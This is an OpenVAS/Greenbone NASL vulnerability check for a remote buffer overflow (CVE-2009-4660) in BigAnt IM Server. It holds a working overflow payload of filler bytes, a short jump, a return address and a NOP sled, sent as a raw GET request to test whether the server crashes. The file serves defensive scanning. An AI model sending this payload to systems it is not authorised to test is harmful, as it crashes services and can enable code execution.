# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bigantsoft:bigant_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100278");
  script_version("2025-02-19T05:37:55+0000");
  script_tag(name:"last_modification", value:"2025-02-19 05:37:55 +0000 (Wed, 19 Feb 2025)");
  script_tag(name:"creation_date", value:"2009-10-01 18:57:31 +0200 (Thu, 01 Oct 2009)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2009-4660");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("BigAnt IM Server HTTP GET Request Buffer Overflow Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_bigant_server_http_detect.nasl");
  script_require_ports("Services/www", 6660);
  script_mandatory_keys("bigant/server/detected");

  script_tag(name:"summary", value:"BigAnt IM Server is prone to a remote buffer overflow
  vulnerability because it fails to perform adequate boundary checks on user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted GET request and checks if the server is still
  responding afterwards.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with
  the privileges of the user running the server. Failed exploit attempts will result in a
  denial-of-service condition.");

  script_tag(name:"affected", value:"BigAnt IM Server version 2.50 is vulnerable. Other versions
  may also be affected.");

  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for
  details.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36407");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

banner = http_get_remote_headers(port: port);

if (banner !~ "Server\s*:\s*AntServer")
  exit(0);

payload =  crap(data: raw_string(0x41), length: 985);
payload += raw_string(0xeb, 0x06, 0x90, 0x90, 0x6a, 0x19, 0x9a, 0x0f);
payload += crap(data: raw_string(0x90), length: 10);

if (!soc = open_sock_tcp(port))
  exit(0);

req = string("GET ", payload, "\r\n\r\n");
send(socket: soc, data: req);
close(soc);

if (http_is_dead(port: port)) {
  security_message(port: port);
  exit(0);
}

exit(0);
